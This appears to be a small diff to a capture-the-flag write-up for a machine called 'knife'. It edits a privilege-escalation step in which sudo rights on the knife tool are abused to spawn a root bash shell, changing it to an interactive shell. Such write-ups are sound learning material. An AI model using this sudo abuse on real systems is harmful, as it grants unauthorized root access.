@@ -436,7 +436,7 @@ I'll use the given command to abuse our `sudo` permissions, but I'll change the
 shell to `/bin/bash`:
 
 ```sh
-james@knife:~$ sudo knife exec -E 'exec "/bin/bash"'
+james@knife:~$ sudo knife exec -E 'exec "/bin/bash -i"'
 ```
 
 ```
